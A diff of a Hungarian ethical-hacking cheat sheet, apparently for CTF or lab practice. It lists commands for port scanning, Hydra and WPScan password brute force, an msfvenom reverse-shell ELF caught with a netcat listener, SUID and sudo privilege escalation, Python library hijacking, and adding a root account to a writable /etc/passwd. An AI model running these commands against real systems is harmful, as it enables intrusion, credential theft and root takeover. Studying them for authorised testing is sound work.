@@ -1,48 +1,69 @@
-# Etikus hackelés jegyzet, enyém amugy de feljavított by ChatGPT
+# Etikus Hackelés Jegyzet
+
+*Eredeti jegyzet: Saját, bővítve és rendszerezve ChatGPT segítségével*
+
+---
+
+## Tartalomjegyzék
+
+1. [Nmap - Portszkennelés](#nmap---portszkennelés)
+2. [HTTP Protokoll és Webes Feltérképezés](#http-protokoll-és-webes-feltérképezés)
+3. [Hydra - Brute Force Jelszótörés](#hydra--brute-force-jelszótörés)
+4. [Reverse / Bind Shell Technika](#reverse--bind-shell-technika)
+5. [Netcat Opcók](#netcat-opcók)
+6. [Stabilabb Shell](#stabilabb-shell)
+7. [CMD Shell Támadás](#cmd-shell-támadás)
+8. [WordPress Támadások](#wordpress)
+9. [Exploit Adatbázis](#exploit-adatbázis)
+10. [Linux Privilege Escalation](#linux-privilege-escalation)
+11. [Felhasználóváltás](#felhasználóváltás)
+12. [/etc/passwd Manipulálása](#etcpasswd-manipulálása)
+13. [LinPEAS](#linpeas)
+14. [/etc/hosts Manipulálása](#etchosts-manipulálása)
+15. [BurpSuite](#burpsuit)
+
+---
 
 ## Nmap - Portszkennelés
 
-- A legtöbb gyakorlatban minden érdekes port benne van az Nmap alapértelmezett 1000 leggyakoribb port listájában, ezért nem szükséges megadni a `-p` kapcsolót.
-- Alapértelmezett szkennelés:
+* Alapértelmezés szerint az Nmap az 1000 leggyakoribb portot szkenneli, így gyakran nem kell megadni a `-p` kapcsolót.
+* Alap szkennelés parancs:
 
 ```bash
 ping <célszerver IP>
 nmap -sS -sV <célszerver IP>
 ```
 
-- `-sS`: TCP SYN szkennelés  
-- `-sV`: Szolgáltatásverzió felismerés
+* `-sS`: TCP SYN szkennelés
+* `-sV`: Szolgáltatásverzió felismerés
 
 ---
 
 ## HTTP Protokoll és Webes Feltérképezés
 
-- Weboldal elérése böngészőből: `http://<ip>`
+* Weboldal ellenőrzése: `http://<ip>`
 
 ### Almappák keresése
 
-- **Dirb (CLI)**
+* **Dirb (CLI)**
 
 ```bash
 dirb http://<ip> -r -U <felhasználónév>:<jelszó>
 ```
 
-- **DirBuster (GUI)**
+* **DirBuster (GUI)** - Java alapú, vizuális mappa feltérképező eszköz
 
 ### Szólisták
 
-- Felhasználónevekhez:  
-  `/usr/share/wordlists/dirb/common.txt`
-
-- Jelszavakhoz (Hydra):  
-  `rockyou.txt`
+* Almappák, felhasználónevek: `/usr/share/wordlists/dirb/common.txt`
+* Jelszavak: `rockyou.txt`
 
 ---
 
 ## Hydra – Brute Force Jelszótörés
 
 ```bash
-hydra -l <username> -P <jelszólista> <ip> http-get
+hydra -l <felhasználónév> -P <jelszólista> <ip> http-get
 ```
 
 ---
@@ -51,26 +72,25 @@ hydra -l <username> -P <jelszólista> <ip> http-get
 
 ### Reverse Shell
 
-1. Válassz egy portot: `1024 < x < 65000` (pl. 4444)
-2. Saját IP lekérése: `ip a`
-3. Shellkód generálása: IP és port beégetése
-4. Shellkód eljuttatása a célgépre
-5. Listener indítása saját gépen:
+1. Szabad port kiválasztása (pl. 4444)
+2. Saját IP lekérdezése: `ip a`
+3. Shellkód generálása (IP + port beágyazva)
+4. Shellkód átjuttatása a célgépre
+5. Listener indítása:
 
 ```bash
 nc -lvnp 4444
 ```
 
-6. Shellkód futtatása a célgépen → kapcsolat létrejön
+6. Shellkód futtatása a célgépen
 
 ### Bind Shell
 
-1. Port kiválasztása ✔  
-2. Cél IP ismerete  
-3. Shellkód generálás ✔  
-4. Kód eljuttatása ✔  
-5. Ugrás a következő pontra  
-6. Kapcsolódás a cél gépen lévő listenerhez:
+1. Port kiválasztása
+2. Cél IP ismerete
+3. Shellkód generálása
+4. Shellkód átjuttatása
+5. Kapcsolódás a célgépre:
 
 ```bash
 nc <cél IP> <port>
@@ -78,16 +98,18 @@ nc <cél IP> <port>
 
 ---
 
-## Netcat Opciók
+## Netcat Opcók
 
-- `-l`: listen mód  
-- `-v`: verbose  
-- `-n`: numeric IP, nincs DNS feloldás  
-- `-p`: port megadása
+* `-l`: Listen mód
+* `-v`: Verbose (részletes)
+* `-n`: Ne oldjon fel DNS-t (numeric only)
+* `-p`: Port megadása
 
 ---
 
 ## Stabilabb Shell
+
+* TTY emuláció:
 
 ```bash
 python3 -c "import pty; pty.spawn('/bin/bash')"
@@ -95,13 +117,13 @@ python3 -c "import pty; pty.spawn('/bin/bash')"
 
 ---
 
-## CMD Shell Támadás
+## CMD Shell Támadás (RCE)
 
-- Olyan fájl vagy input mező sebezhető, ahol a célgép kódfuttatást enged.
+* Input mezők vagy futtatható fájlok kódfuttatásra kihasználhatók lehetnek
 
-### Példa: ELF fájl futtatása
+### ELF fájl futtatása (Reverse Shell generálás)
 
-1. Támadó oldalon generáljuk a shellt:
+1. Shell generálás (támadó gépen):
 
 ```bash
 msfvenom -p linux/x64/shell_reverse_tcp LHOST=<támadó IP> LPORT=4444 -f elf > shell.elf
@@ -113,13 +135,13 @@ msfvenom -p linux/x64/shell_reverse_tcp LHOST=<támadó IP> LPORT=4444 -f elf > 
 nc -lvp 4444
 ```
 
-3. HTTP szerver indítása:
+3. HTTP szerver indítása fájl átvitelhez:
 
 ```bash
 python3 -m http.server
 ```
 
-4. Célgépen shell futtatása:
+4. Célgépen:
 
 ```bash
 cd /tmp
@@ -133,13 +155,13 @@ chmod +x shell.elf
 
 ## WordPress
 
-- WPScan:
+* WPScan használata:
 
 ```bash
-wpscan --url http://<url> -e at,ap,u --usernames <user> --passwords <passwordlist>
+wpscan --url http://<url> -e at,ap,u --usernames <felhasználó> --passwords <jelszólista>
 ```
 
-- Exploit keresés:
+* Exploit keresés Metasploit-ban:
 
 ```bash
 msfconsole
@@ -153,7 +175,8 @@ run
 
 ## Exploit Adatbázis
 
-- https://exploit-db.com
+* Közismert exploit gyűjtemény:
+  [exploit-db.com](https://exploit-db.com)
 
 ---
 
@@ -165,42 +188,45 @@ run
 find / -perm -u=s 2>/dev/null
 ```
 
-- GTFObins segítségével nézd meg, mire használható a bináris.  
-  https://gtfobins.github.io
+* Használd a GTFObins oldalt a binárisok kihasználhatóságának ellenőrzésére: [https://gtfobins.github.io](https://gtfobins.github.io)
 
 ### 2. SSH Privát Kulcsok
 
-- Ellenőrizd:  
+* Ellenőrizendő elérési út:
   `/home/<user>/.ssh/`
 
-Sima felhasználónév jelszó:
-```ssh -p port usernev@ip```
+* Bejelentkezés:
 
-Privát RSA kulccsal belépés ha megvan:
-```ssh -p port -i <privkulcs elérhetőség>```
+```bash
+ssh -p <port> <felhasználó>@<ip>
+```
 
-### 3. Sudo jogosultságok megnézése a current userre
+* Privát kulccsal:
+
+```bash
+ssh -p <port> -i <kulcs_elérés> <felhasználó>@<ip>
+```
+
+### 3. Sudo Jogosultságok
 
 ```bash
 sudo -l
 ```
 
-### 4. /etc/passwd és /etc/shadow jogai
+### 4. /etc/passwd és /etc/shadow vizsgálata
 
-```cat```-eljük ki őket, nézzük meg.
-
-- Fájl jogosultságok ellenőrzése:
+* Jogosultságellenőrzés:
 
 ```bash
-getfacl <fájlnév>
+getfacl /etc/passwd
+getfacl /etc/shadow
 ```
 
-- Hash törés:  
-  `john` vagy `hashcat`
+* Hash töréshez: `john`, `hashcat`
 
 ### 5. Python Library Hijacking
 
-- Ha a célgépen a script saját mappából importál, akkor saját `random.py` fájl létrehozásával tetszőleges kódot futtathatunk.
+* Ha a script bízik a lokális importban (pl. `import random`), akkor tetszőleges kód is futtatható saját `random.py` létrehozásával.
 
 ---
 
@@ -213,16 +239,17 @@ sudo -u <user> <parancs>
 
 ---
 
-## /etc/passwd manipulálása
+## /etc/passwd Manipulálása
 
-Ha van írási jogunk:
+Ha írható a fájl, root joggal lehet belépni saját félhasználóval:
+
+1. Hash generálás:
 
 ```bash
 openssl passwd -5 korte
-# kimenet: $5$...
 ```
 
-Majd:
+2. Sor hozzáadása:
 
 ```bash
 echo 'hacker:$5$...:0:0:root:/root:/bin/bash' >> /etc/passwd
@@ -232,22 +259,35 @@ echo 'hacker:$5$...:0:0:root:/root:/bin/bash' >> /etc/passwd
 
 ## LinPEAS
 
-- Automatikus sebezhetőségvizsgáló eszköz:  
-  https://github.com/carlospolop/PEASS-ng
+* Automatizált privilege escalation szkript:
+  [https://github.com/carlospolop/PEASS-ng](https://github.com/carlospolop/PEASS-ng)
 
 ---
 
-## /etc/hosts manipulálása
+## /etc/hosts Manipulálása
 
-Először
+1. Fájl szerkesztése:
+
 ```bash
 sudo nano /etc/hosts
 ```
-majd <ip> <local domain> beillesztése, és mentés.
+
+2. Sor hozzáadása:
+
+```
+<ip> <local domain>
+```
 
 ---
+
 ## BurpSuit
 
-```burpsuite``` parancs a futtatásra
+* Futtatás CLI-ből:
+
+```bash
+burpsuite
+```
+
+* HTTP kérések elfogása, manipulálása, automatizált tesztelésre.
 
 ---
